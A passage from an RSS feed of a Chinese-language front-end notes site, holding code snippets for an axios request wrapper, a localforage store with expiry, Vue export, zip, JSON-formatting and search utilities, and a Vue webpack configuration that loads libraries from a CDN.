  <span>400</span><span>:</span> <span>'请求错误'</span><span>,</span>
  <span>401</span><span>:</span> <span>'授权验证失败，请重新登录！'</span><span>,</span>
  <span>403</span><span>:</span> <span>'无访问权限'</span><span>,</span>
  <span>404</span><span>:</span> <span>'请求地址错误'</span><span>,</span>
  <span>500</span><span>:</span> <span>'服务器错误'</span><span>,</span>
  <span>502</span><span>:</span> <span>'网关错误'</span><span>,</span>
  <span>503</span><span>:</span> <span>'服务不可用'</span><span>,</span>
  <span>504</span><span>:</span> <span>'网关超时'</span><span>,</span>
<span>}</span>

<span>const</span> <span>logout</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  store<span>.</span><span>removeItem</span><span>(</span>UserStoreEnum<span>.</span><span>ACCESS_TOKEN</span><span>)</span>
  <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> loginPath <span>=</span> <span>'/login'</span>
    <span>const</span> <span>{</span> pathname <span>}</span> <span>=</span> history<span>.</span>location
    <span>if</span> <span>(</span>pathname <span>!==</span> loginPath<span>)</span> <span>{</span>
      history<span>.</span><span>replace</span><span>(</span><span>{</span>
        pathname<span>:</span> loginPath<span>,</span>
        search<span>:</span> <span>stringify</span><span>(</span><span>{</span>
          redirect<span>:</span> pathname<span>,</span>
        <span>}</span><span>)</span><span>,</span>
      <span>}</span><span>)</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>1500</span><span>)</span>
<span>}</span>

<span>interface</span> <span>AxiosExtensionConfig</span> <span>extends</span> <span>AxiosRequestConfig</span> <span>{</span>
  <span>/**
   * @name 跳过错误处理
   */</span>
  skipErrorHandler<span>?</span><span>:</span> <span>boolean</span>
<span>}</span>

<span>interface</span> <span>AxiosInstance</span> <span>extends</span> <span>Axios</span> <span>{</span>
  <span>(</span>config<span>:</span> AxiosExtensionConfig<span>)</span><span>:</span> <span>AxiosPromise</span>
  <span>(</span>url<span>:</span> <span>string</span><span>,</span> config<span>?</span><span>:</span> AxiosExtensionConfig<span>)</span><span>:</span> AxiosPromise
<span>}</span>

<span>const</span> request <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>{</span>
  baseURL<span>:</span> <span>APP_BASE_URL</span><span>,</span>
  <span>// withCredentials: true,</span>
  <span>// xsrfCookieName: 'cToken',</span>
  <span>// xsrfHeaderName: 'cToken',</span>
  <span>paramsSerializer</span><span>:</span> params <span>=></span> qs<span>.</span><span>stringify</span><span>(</span>params<span>,</span> <span>{</span> arrayFormat<span>:</span> <span>'repeat'</span> <span>}</span><span>)</span><span>,</span>
<span>}</span><span>)</span> <span>as</span> AxiosInstance

<span>type</span> <span>ErrorThrowerProps</span> <span>=</span> <span>{</span>
  success<span>:</span> <span>boolean</span>
  code<span>:</span> <span>number</span>
  errorMessage<span>:</span> <span>string</span>
<span>}</span>

<span>// 错误处理</span>
<span>const</span> <span>errorHandler</span> <span>=</span> <span>(</span>error<span>:</span> <span>any</span><span>,</span> config<span>?</span><span>:</span> AxiosExtensionConfig<span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>config<span>?.</span>skipErrorHandler<span>)</span> <span>return</span> error
  <span>if</span> <span>(</span>error<span>.</span>name <span>===</span> <span>'BizError'</span><span>)</span> <span>{</span>
    <span>const</span> <span>{</span> code<span>,</span> errorCode<span>,</span> errorMessage <span>}</span> <span>=</span>
      error<span>.</span>info <span>as</span> ErrorThrowerProps <span>&amp;</span> <span>{</span>
        errorCode<span>:</span> CodeTypeEnum
        errorMessage<span>:</span> <span>string</span>
      <span>}</span>

    <span>const</span> errorStrategy <span>=</span> <span>{</span>
      <span>[</span>CodeTypeEnum<span>.</span><span>REDIRECT</span><span>]</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        notification<span>.</span><span>warning</span><span>(</span><span>{</span> message<span>:</span> code<span>,</span> description<span>:</span> errorMessage <span>}</span><span>)</span>
        <span>logout</span><span>(</span><span>)</span>
      <span>}</span><span>,</span>
      <span>[</span>CodeTypeEnum<span>.</span><span>BACK_PREVIOUS</span><span>]</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        notification<span>.</span><span>warning</span><span>(</span><span>{</span> message<span>:</span> code<span>,</span> description<span>:</span> errorMessage <span>}</span><span>)</span>
        history<span>.</span><span>go</span><span>(</span><span>-</span><span>1</span><span>)</span>
      <span>}</span><span>,</span>
      <span>[</span>CodeTypeEnum<span>.</span><span>ERROR_NOTIFICATION</span><span>]</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
        notification<span>.</span><span>error</span><span>(</span><span>{</span> message<span>:</span> code<span>,</span> description<span>:</span> errorMessage <span>}</span><span>)</span>
      <span>}</span><span>,</span>
    <span>}</span>

    <span>const</span> strategy <span>=</span> errorStrategy<span>[</span>errorCode<span>!</span><span>]</span>
    strategy
      <span>?</span> <span>strategy</span><span>(</span><span>)</span>
      <span>:</span> message<span>.</span><span>error</span><span>(</span>errorMessage <span>||</span> <span>'No error message! Please retry.'</span><span>)</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span>error<span>.</span>response<span>)</span> <span>{</span>
    <span>const</span> <span>{</span> status <span>}</span> <span>=</span> error<span>.</span>response
    <span>if</span> <span>(</span>codeMessage<span>[</span>status<span>]</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span>status <span>===</span> <span>401</span><span>)</span> <span>logout</span><span>(</span><span>)</span>
      notification<span>.</span><span>error</span><span>(</span><span>{</span>
        message<span>:</span> status<span>,</span>
        description<span>:</span> codeMessage<span>[</span>status<span>]</span><span>,</span>
      <span>}</span><span>)</span>
    <span>}</span> <span>else</span> message<span>.</span><span>error</span><span>(</span><span>'Response error! Please retry.'</span><span>)</span>
  <span>}</span> <span>else</span> <span>if</span> <span>(</span>error<span>.</span>request<span>)</span> <span>{</span>
    message<span>.</span><span>error</span><span>(</span><span>'None response! Please retry.'</span><span>)</span>
  <span>}</span> <span>else</span> <span>{</span>
    message<span>.</span><span>error</span><span>(</span><span>'Request error! Please retry.'</span><span>)</span>
  <span>}</span>

  <span>return</span> <span>Promise</span><span>.</span><span>reject</span><span>(</span>error<span>)</span>
<span>}</span>

<span>// 请求拦截器</span>
request<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span><span>async</span> <span>(</span>config<span>:</span> AxiosRequestConfig<span>)</span> <span>=></span> <span>{</span>
  <span>const</span> token <span>=</span> <span>await</span> store<span>.</span><span><span>getItem</span><span><span>&lt;</span><span>string</span><span>></span></span></span><span>(</span>UserStoreEnum<span>.</span><span>ACCESS_TOKEN</span><span>)</span>
  <span>if</span> <span>(</span>token <span>&amp;&amp;</span> config<span>.</span>headers<span>)</span> config<span>.</span>headers<span>.</span>token <span>=</span> token

  <span>return</span> config
<span>}</span><span>,</span> errorHandler<span>)</span>

<span>// 响应拦截器</span>
request<span>.</span>interceptors<span>.</span>response<span>.</span><span>use</span><span>(</span><span>async</span> <span>(</span><span>{</span> data<span>,</span> config <span>}</span><span>:</span> <span>any</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>data <span>instanceof</span> <span>Blob</span><span>)</span> <span>return</span> data

  <span>const</span> <span>{</span> success<span>,</span> code<span>,</span> errorMessage <span>}</span> <span>=</span> data
  <span>if</span> <span>(</span><span>!</span>success<span>)</span> <span>{</span>
    <span>const</span> error <span>=</span> <span>{</span>
      name<span>:</span> <span>'BizError'</span><span>,</span>
      info<span>:</span> <span>{</span> <span>...</span>data<span>,</span> errorCode<span>:</span> CodeType<span>[</span>code<span>]</span><span>,</span> errorMessage <span>}</span><span>,</span>
    <span>}</span>
    <span>errorHandler</span><span>(</span>error<span>,</span> config<span>)</span>
    <span>return</span> <span>Promise</span><span>.</span><span>reject</span><span>(</span>error<span>)</span>
  <span>}</span>

  <span>return</span> data
<span>}</span><span>,</span> errorHandler<span>)</span>

<span>export</span> <span>default</span> request
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br><span>137</span><br><span>138</span><br><span>139</span><br><span>140</span><br><span>141</span><br><span>142</span><br><span>143</span><br><span>144</span><br><span>145</span><br><span>146</span><br><span>147</span><br><span>148</span><br><span>149</span><br><span>150</span><br><span>151</span><br><span>152</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Store</title>
      <link>https://www.matrixtheone.ga/web/note/Utils/Store/</link>
      <guid>https://www.matrixtheone.ga/web/note/Utils/Store/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Store</source>
      <category>Utils</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-store"> 1. Store</h2>
<ul>
<li>新增有效期设置，<a href="https://localforage.docschina.org/" target="_blank" rel="noopener noreferrer">localforage</a></li>
</ul>
<div><pre><code><span>import</span> localforage <span>from</span> <span>'localforage'</span>

<span>interface</span> <span>StoreData</span> <span>{</span>
  value<span>?</span><span>:</span> <span>any</span>
  expiryTime<span>?</span><span>:</span> <span>number</span>
  createTime<span>:</span> <span>number</span>
<span>}</span>

<span>const</span> <span>getItem</span> <span>=</span> <span>async</span> <span>(</span>key<span>:</span> <span>string</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> data <span>=</span> <span>await</span> localforage<span>.</span><span><span>getItem</span><span><span>&lt;</span>StoreData<span>></span></span></span><span>(</span>key<span>)</span>
  <span>if</span> <span>(</span><span>!</span>data<span>)</span> <span>return</span> <span>null</span>

  <span>if</span> <span>(</span>data<span>.</span>expiryTime <span>&amp;&amp;</span> Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> data<span>?.</span>createTime <span>></span> data<span>.</span>expiryTime<span>)</span> <span>{</span>
    localforage<span>.</span><span>removeItem</span><span>(</span>key<span>)</span>
    <span>return</span> <span>null</span>
  <span>}</span>

  <span>return</span> data<span>.</span>value
<span>}</span>

<span>const</span> <span>setItem</span> <span>=</span> <span>async</span> <span>(</span>key<span>:</span> <span>string</span><span>,</span> value<span>?</span><span>:</span> <span>any</span><span>,</span> expiryTime<span>?</span><span>:</span> <span>number</span><span>)</span> <span>=></span> <span>{</span>
  <span>await</span> localforage<span>.</span><span><span>setItem</span><span><span>&lt;</span>StoreData<span>></span></span></span><span>(</span>key<span>,</span> <span>{</span>
    value<span>,</span>
    expiryTime<span>,</span>
    createTime<span>:</span> Date<span>.</span><span>now</span><span>(</span><span>)</span><span>,</span>
  <span>}</span><span>)</span>

  <span>return</span> value
<span>}</span>

<span>type</span> <span>LocalForage</span> <span>=</span> <span>typeof</span> localforage <span>&amp;</span> <span>{</span>
  setItem<span>:</span> <span>typeof</span> setItem
<span>}</span>

<span>const</span> store <span>=</span> <span>{</span>
  <span>...</span>localforage<span>,</span>
  getItem<span>,</span>
  setItem<span>,</span>
<span>}</span> <span>as</span> LocalForage

<span>export</span> <span>default</span> store
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>业务</title>
      <link>https://www.matrixtheone.ga/web/note/Vue/Business/</link>
      <guid>https://www.matrixtheone.ga/web/note/Vue/Business/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">业务</source>
      <category>Vue</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-json-导出为-excel"> 1. JSON 导出为 Excel</h2>
<div><pre><code><span>import</span> <span>{</span> export_json_to_excel <span>as</span> exportJsonToExcel <span>}</span> <span>from</span> <span>'@/plugins/Export2Excel'</span>

<span>exportExcel</span> <span>(</span><span>row</span><span>)</span> <span>{</span>
  <span>const</span> excelData <span>=</span> <span>[</span>
    <span>[</span><span>'疫情报送表'</span><span>]</span><span>,</span>
    <span>[</span><span>'年龄'</span><span>,</span> <span>'性别'</span><span>,</span> <span>'姓名'</span><span>]</span><span>,</span>
    <span>[</span><span>18</span><span>,</span> <span>'男'</span><span>,</span> <span>'jack'</span><span>]</span><span>,</span>
    <span>[</span><span>17</span><span>,</span> <span>'男'</span><span>,</span> <span>'pony'</span><span>]</span><span>,</span>
    <span>[</span><span>16</span><span>,</span> <span>'男'</span><span>,</span> <span>'coderljw'</span><span>]</span><span>,</span>
    <span>[</span><span>''</span><span>]</span><span>,</span>
    <span>[</span><span>'互联网报表'</span><span>]</span><span>,</span>
    <span>[</span><span>'年龄'</span><span>,</span> <span>'性别'</span><span>,</span> <span>'姓名'</span><span>]</span><span>,</span>
    <span>[</span><span>18</span><span>,</span> <span>'男'</span><span>,</span> <span>'jack'</span><span>]</span><span>,</span>
    <span>[</span><span>17</span><span>,</span> <span>'男'</span><span>,</span> <span>'pony'</span><span>]</span><span>,</span>
    <span>[</span><span>16</span><span>,</span> <span>'男'</span><span>,</span> <span>'coderljw'</span><span>]</span><span>,</span>
    <span>[</span><span>''</span><span>]</span><span>,</span>
  <span>]</span>
  <span>exportJsonToExcel</span><span>(</span>excelData<span>,</span> row<span>.</span>name<span>)</span>
<span>}</span>

</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><ul>
<li><a href="https://github.com/Matrix-The-One/web/blob/assets/plugins/Export2Excel.js" target="_blank" rel="noopener noreferrer">Export2Excel.js</a>、<a href="https://github.com/Matrix-The-One/web/blob/assets/plugins/Blob.js" target="_blank" rel="noopener noreferrer">Blob.js</a></li>
</ul>
<h2 id="_2-导出压缩文件"> 2. 导出压缩文件</h2>
<div><pre><code><span>import</span> <span>{</span> downloadFile<span>,</span> fileBlob <span>}</span> <span>from</span> <span>'@/common/downloadFile'</span>
<span>import</span> FileSaver <span>from</span> <span>'file-saver'</span>
<span>import</span> JSZip <span>from</span> <span>'jszip'</span>

<span>async</span> <span>batchDownload</span> <span>(</span><span>)</span> <span>{</span>
  <span>const</span> <span>{</span> fileList<span>,</span> row<span>,</span> $message <span>}</span> <span>=</span> <span>this</span>
  <span>const</span> zip <span>=</span> <span>new</span> <span>JSZip</span><span>(</span><span>)</span>
  $message<span>.</span><span>loading</span><span>(</span><span>{</span>
    <span>content</span><span>:</span> <span>'加载中'</span><span>,</span>
    <span>duration</span><span>:</span> <span>0</span>
  <span>}</span><span>)</span>
  <span>const</span> blobList <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span>fileList<span>.</span><span>map</span><span>(</span><span>item</span> <span>=></span> <span>fileBlob</span><span>(</span>item<span>)</span><span>)</span><span>)</span>
  blobList<span>.</span><span>forEach</span><span>(</span><span>(</span><span>blob<span>,</span> index</span><span>)</span> <span>=></span>
    zip<span>.</span><span>file</span><span>(</span><span><span>`</span><span><span>${</span>index <span>+</span> <span>1</span><span>}</span></span><span>-</span><span><span>${</span>fileList<span>[</span>index<span>]</span><span>.</span>name<span>}</span></span><span>`</span></span><span>,</span> blob<span>,</span> <span>{</span>
      <span>binary</span><span>:</span> <span>true</span>
    <span>}</span><span>)</span>
  <span>)</span>
  zip
    <span>.</span><span>generateAsync</span><span>(</span><span>{</span>
      <span>type</span><span>:</span> <span>'blob'</span>
    <span>}</span><span>)</span>
    <span>.</span><span>then</span><span>(</span><span>content</span> <span>=></span> FileSaver<span>.</span><span>saveAs</span><span>(</span>content<span>,</span> <span><span>`</span><span><span>${</span>row<span>.</span>name<span>}</span></span><span>.zip</span><span>`</span></span><span>)</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_3-json-美化"> 3. JSON 美化</h2>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>log-params<span>"</span></span><span>></span></span>{{ logParams }}<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>this</span><span>.</span>logParams <span>=</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>JSON</span><span>.</span><span>parse</span><span>(</span>row<span>.</span>ParamInfo<span>)</span><span>,</span> <span>null</span><span>,</span> <span>4</span><span>)</span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>.log-params</span> <span>{</span>
  <span>white-space</span><span>:</span> pre-wrap<span>;</span>
  <span>font-family</span><span>:</span> monospace<span>;</span>
  <span>word-wrap</span><span>:</span> break-word<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_4-检索关键字"> 4. 检索关键字</h2>
<div><pre><code><span>const</span> <span>{</span> searchValue<span>,</span> treeData <span>}</span> <span>=</span> <span>this</span>

<span>const</span> matchAry <span>=</span> <span>[</span><span>]</span>
<span>const</span> regStr <span>=</span> searchValue
  <span>.</span><span>split</span><span>(</span><span>''</span><span>)</span>
  <span>.</span><span>map</span><span>(</span><span>item</span> <span>=></span> <span><span>`</span><span>(</span><span><span>${</span>item<span>}</span></span><span>)([\\s\\S]*)</span><span>`</span></span><span>)</span>
  <span>.</span><span>join</span><span>(</span><span>''</span><span>)</span>
<span>const</span> reg <span>=</span> <span>new</span> <span>RegExp</span><span>(</span>regStr<span>)</span>

<span>// 递归查询匹配项</span>
<span>const</span> <span>recursion</span> <span>=</span> <span>ary</span> <span>=></span>
  ary<span>.</span><span>forEach</span><span>(</span><span>item</span> <span>=></span> <span>{</span>
    <span>if</span> <span>(</span>reg<span>.</span><span>test</span><span>(</span>item<span>.</span>name<span>)</span><span>)</span> matchAry<span>.</span><span>push</span><span>(</span><span>{</span> <span>...</span>item <span>}</span><span>)</span>
    <span>if</span> <span>(</span>item<span>.</span>childDepartments<span>?.</span>length<span>)</span> <span>recursion</span><span>(</span>item<span>.</span>childDepartments<span>)</span>
  <span>}</span><span>)</span>

<span>recursion</span><span>(</span>treeData<span>)</span>
<span>this</span><span>.</span>matchAry <span>=</span> matchAry
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Config</title>
      <link>https://www.matrixtheone.ga/web/note/Vue/Config/</link>
      <guid>https://www.matrixtheone.ga/web/note/Vue/Config/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Config</source>
      <category>Vue</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-index-html"> 1. index.html</h2>
<div><pre><code><span><span>&lt;!</span><span>DOCTYPE</span> <span>html</span><span>></span></span>
<span><span><span>&lt;</span>html</span> <span>lang</span><span><span>=</span><span>"</span>zh-cmn-Hans<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>head</span><span>></span></span>
    <span><span><span>&lt;</span>meta</span> <span>charset</span><span><span>=</span><span>"</span>utf-8<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>X-UA-Compatible<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>IE=edge<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>meta</span> <span>name</span><span><span>=</span><span>"</span>viewport<span>"</span></span> <span>content</span><span><span>=</span><span>"</span>width=device-width,initial-scale=1.0<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>icon<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>&lt;%= BASE_URL %>logo.png<span>"</span></span> <span>/></span></span>
    <span><span><span>&lt;</span>title</span><span>></span></span>Ant Design Pro<span><span><span>&lt;/</span>title</span><span>></span></span>
    <span><span><span>&lt;</span>style</span><span>></span></span><span></span><span><span><span>&lt;/</span>style</span><span>></span></span>
    <span>&lt;!-- 引入CSS的CDN资源 --></span>
    &lt;% for (var i in htmlWebpackPlugin.options.cdn &amp;&amp;
    htmlWebpackPlugin.options.cdn.css) { %>
    <span><span><span>&lt;</span>link</span> <span>rel</span><span><span>=</span><span>"</span>stylesheet<span>"</span></span> <span>href</span><span><span>=</span><span>"</span>&lt;%= htmlWebpackPlugin.options.cdn.css[i] %><span>"</span></span> <span>/></span></span>
    &lt;% } %>
  <span><span><span>&lt;/</span>head</span><span>></span></span>
  <span><span><span>&lt;</span>body</span><span>></span></span>
    <span><span><span>&lt;</span>noscript</span><span>></span></span>
      <span><span><span>&lt;</span>strong</span>
        <span>></span></span>非常抱歉！您的浏览器暂不支持JavaScript，请升级您的浏览器！<span><span><span>&lt;/</span>strong</span>
      <span>></span></span>
    <span><span><span>&lt;/</span>noscript</span><span>></span></span>
    <span><span><span>&lt;</span>div</span> <span>id</span><span><span>=</span><span>"</span>app<span>"</span></span><span>></span></span><span><span><span>&lt;/</span>div</span><span>></span></span>
    <span>&lt;!-- 引入JS的CDN资源 --></span>
    &lt;% for (var i in htmlWebpackPlugin.options.cdn &amp;&amp;
    htmlWebpackPlugin.options.cdn.js) { %>
    <span><span><span>&lt;</span>script</span>
      <span>type</span><span><span>=</span><span>"</span>text/javascript<span>"</span></span>
      <span>src</span><span><span>=</span><span>"</span>&lt;%= htmlWebpackPlugin.options.cdn.js[i] %><span>"</span></span>
    <span>></span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
    &lt;% } %>
  <span><span><span>&lt;/</span>body</span><span>></span></span>
<span><span><span>&lt;/</span>html</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br></div></div><h2 id="_2-vue-config-js"> 2. vue.config.js</h2>
<div><pre><code><span>const</span> path <span>=</span> <span>require</span><span>(</span><span>'path'</span><span>)</span>
<span>const</span> webpack <span>=</span> <span>require</span><span>(</span><span>'webpack'</span><span>)</span>
<span>const</span> BundleAnalyzerPlugin <span>=</span> <span>require</span><span>(</span><span>'webpack-bundle-analyzer'</span><span>)</span>
  <span>.</span>BundleAnalyzerPlugin
<span>const</span> CompressionPlugin <span>=</span> <span>require</span><span>(</span><span>'compression-webpack-plugin'</span><span>)</span>

<span>// 设置别名</span>
<span>const</span> <span>resolve</span> <span>=</span> <span>dir</span> <span>=></span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> dir<span>)</span>

<span>const</span> isProd <span>=</span> process<span>.</span>env<span>.</span><span>NODE_ENV</span> <span>===</span> <span>'production'</span>

<span>// CDN资源</span>
<span>const</span> assetsCDN <span>=</span> <span>{</span>
  <span>externals</span><span>:</span> <span>{</span>
    <span>vue</span><span>:</span> <span>'Vue'</span><span>,</span>
    <span>'vue-router'</span><span>:</span> <span>'VueRouter'</span><span>,</span>
    <span>vuex</span><span>:</span> <span>'Vuex'</span><span>,</span>
    <span>axios</span><span>:</span> <span>'axios'</span><span>,</span>
  <span>}</span><span>,</span>
  <span>css</span><span>:</span> <span>[</span><span>]</span><span>,</span>
  <span>js</span><span>:</span> <span>[</span>
    <span>'//cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.min.js'</span><span>,</span>
    <span>'//cdn.jsdelivr.net/npm/vue-router@3.1.3/dist/vue-router.min.js'</span><span>,</span>
    <span>'//cdn.jsdelivr.net/npm/vuex@3.1.1/dist/vuex.min.js'</span><span>,</span>
    <span>'//cdn.jsdelivr.net/npm/axios@0.19.0/dist/axios.min.js'</span><span>,</span>
  <span>]</span><span>,</span>
<span>}</span>

<span>// 生产模式插件</span>
<span>let</span> plugins <span>=</span> <span>[</span>
  <span>// 忽略moment.js的所有语言环境文件（减小打包体积）</span>
  <span>new</span> <span>webpack<span>.</span>IgnorePlugin</span><span>(</span><span><span>/</span><span>^\.\/locale$</span><span>/</span></span><span>,</span> <span><span>/</span><span>moment$</span><span>/</span></span><span>)</span><span>,</span>
  <span>// 打包文件可视化分析</span>
  <span>new</span> <span>BundleAnalyzerPlugin</span><span>(</span><span>)</span><span>,</span>
  <span>// GZip压缩</span>
  <span>new</span> <span>CompressionPlugin</span><span>(</span><span>{</span>
    <span>test</span><span>:</span> <span><span>/</span><span>\.(js|css)(\?.*)?$</span><span>/</span><span>i</span></span><span>,</span> <span>// 需要压缩的文件类型</span>
    <span>threshold</span><span>:</span> <span>10240</span><span>,</span> <span>// 文件大于10k时启用压缩</span>
    <span>deleteOriginalAssets</span><span>:</span> <span>false</span><span>,</span> <span>// 压缩后保留原文件</span>
  <span>}</span><span>)</span><span>,</span>
<span>]</span>

<span>// 添加生产模式插件</span>
<span>if</span> <span>(</span>isProd<span>)</span> plugins <span>=</span> <span>[</span><span>...</span>plugins<span>]</span>

<span>const</span> vueConfig <span>=</span> <span>{</span>
  <span>// 发布路径修改</span>
  <span>publicPath</span><span>:</span> <span>'./'</span><span>,</span>
  <span>configureWebpack</span><span>:</span> <span>{</span>
    plugins<span>,</span>
    <span>externals</span><span>:</span> isProd <span>?</span> assetsCDN<span>.</span>externals <span>:</span> <span>{</span><span>}</span><span>,</span>
  <span>}</span><span>,</span>

  <span>chainWebpack</span><span>:</span> <span>config</span> <span>=></span> <span>{</span>
    config<span>.</span>resolve<span>.</span>alias<span>.</span><span>set</span><span>(</span><span>'@$'</span><span>,</span> <span>resolve</span><span>(</span><span>'src'</span><span>)</span><span>)</span>

    <span>// 使用icon、svg图片</span>
    <span>const</span> svgRule <span>=</span> config<span>.</span>module<span>.</span><span>rule</span><span>(</span><span>'svg'</span><span>)</span>
    svgRule<span>.</span>uses<span>.</span><span>clear</span><span>(</span><span>)</span>
    svgRule
      <span>.</span><span>oneOf</span><span>(</span><span>'inline'</span><span>)</span>
      <span>.</span><span>resourceQuery</span><span>(</span><span><span>/</span><span>inline</span><span>/</span></span><span>)</span>
      <span>.</span><span>use</span><span>(</span><span>'vue-svg-icon-loader'</span><span>)</span>
      <span>.</span><span>loader</span><span>(</span><span>'vue-svg-icon-loader'</span><span>)</span>
      <span>.</span><span>end</span><span>(</span><span>)</span>
      <span>.</span><span>end</span><span>(</span><span>)</span>
